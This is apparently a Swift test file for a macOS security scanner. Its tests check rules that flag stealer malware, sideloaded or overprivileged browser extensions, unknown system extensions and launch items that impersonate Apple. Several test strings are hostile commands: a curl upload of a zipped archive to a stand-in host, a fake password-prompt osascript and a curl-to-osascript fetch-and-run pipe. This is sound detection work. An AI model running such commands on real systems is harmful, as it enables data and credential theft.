import Foundation
import Testing
@testable import BluehatCore

struct StarterRuleTests {
    let rulebook: Rulebook

    init() throws {
        let url = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .appending(components: "rules", "rules.json")
        rulebook = try Rulebook.decode(from: Data(contentsOf: url))
    }

    func matches(_ ruleID: String, _ text: String) throws -> Bool {
        let rule = try #require(rulebook.rules.first { $0.id == ruleID })
        return Scanner.matches(Scanner.regexes(rule.patterns), text)
    }

    @Test(arguments: [
        "curl --connect-timeout 120 --max-time 300 -X POST -F \"file=@/tmp/out.zip\" https://sivvino.example/contact",
        "ditto -c -k --sequesterRsrc /tmp/9556/ /tmp/out.zip",
        "osascript -e display dialog \"Application wants to install helper\" default answer \"\" with hidden answer",
        "curl -fsSL https://x.example/a.scpt | osascript",
    ])
    func detectsStealerActivity(command: String) throws {
        #expect(try matches("process.stealer-activity", command))
    }

    @Test(arguments: [
        "curl -F file=@/Users/me/report.pdf https://upload.example",
        "ditto -c -k --sequesterRsrc --keepParent MyApp.app MyApp.zip",
        "osascript -e display dialog \"Done\"",
    ])
    func ignoresNormalCommands(command: String) throws {
        #expect(try !matches("process.stealer-activity", command))
    }

    @Test func detectsAmosBackdoorLoop() throws {
        #expect(try matches("process.stealer-backdoor", "/bin/bash /Users/alex/.agent"))
        #expect(try !matches("process.stealer-backdoor", "/Users/alex/.agentrc-loader"))
    }

    @Test func flagsOnlyExtensionsOutsideOfficialStores() throws {
        let store = "browser=Chrome id=a name=Grammar update=https://clients2.google.com/service/update2/crx permissions=storage"
        let edge = "browser=Edge id=b name=Notes update=https://edge.microsoft.com/extensionwebstorebase/v1/crx permissions="
        let mozilla = "browser=Firefox id=c name=Blocker update=addons.mozilla.org permissions=storage"
        #expect(try !matches("extension.sideloaded", store))
        #expect(try !matches("extension.sideloaded", edge))
        #expect(try !matches("extension.sideloaded", mozilla))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=d name=PDF update=https://evil.example/u.xml permissions="))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=e name=PDF update=none permissions="))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=f name=x update=https://clients2.google.com/service/update2/crx update=https://evil.example/u.xml permissions="))
    }

    @Test func flagsCookieAccessOnAllSitesOnly() throws {
        #expect(try matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=cookies,<all_urls>"))
        #expect(try matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=*://*/*,storage,cookies"))
        #expect(try !matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=cookies,https://mail.example/*"))
        #expect(try !matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=<all_urls>,storage"))
    }

    @Test func flagsDebuggerAndProxyPermissions() throws {
        #expect(try matches("extension.debugger-proxy", "browser=Chrome id=a name=x update=none permissions=storage,debugger"))
        #expect(try matches("extension.debugger-proxy", "browser=Firefox id=a name=x update=none permissions=proxy,<all_urls>"))
        #expect(try !matches("extension.debugger-proxy", "browser=Chrome id=a name=x update=none permissions=storage,tabs"))
    }

    @Test func flagsSystemExtensionsOnlyFromUnlistedVendors() throws {
        let rule = try #require(rulebook.rules.first { $0.id == "sysext.unknown-vendor" })
        let extensions = [
            (bundle: "io.tailscale.ipn.macsys.network-extension", team: Optional("W5364U7YZB"), detail: "Tailscale"),
            (bundle: "io.macfuse.filesystems.macfuse", team: String?.none, detail: "macFUSE"),
            (bundle: "com.example.filter", team: Optional("AB12CD34EF"), detail: "Unknown filter"),
            (bundle: "com.example.rootkit", team: String?.none, detail: "Unknown kext"),
        ]
        #expect(Scanner.systemExtensionFindings([rule], extensions: extensions).map(\.detail) == ["Unknown filter", "Unknown kext"])
    }

    @Test func flagsOnlyXProtectBelowTheMinimum() throws {
        let rule = try #require(rulebook.rules.first { $0.id == "xprotect.outdated" })
        let minimum = try #require(rule.minimumVersion)
        #expect(Scanner.xprotectFindings([rule], version: minimum - 1).count == 1)
        #expect(Scanner.xprotectFindings([rule], version: minimum).isEmpty)
    }

    @Test func detectsAppleNamedLaunchItemsOutsideSystem() throws {
        #expect(try matches("launch.apple-impersonation", "/Users/alex/Library/LaunchAgents/com.apple.crashreporter.helper.plist"))
        #expect(try matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.apple.systemupdater.plist"))
        #expect(try !matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.google.keystone.daemon.plist"))
    }
}
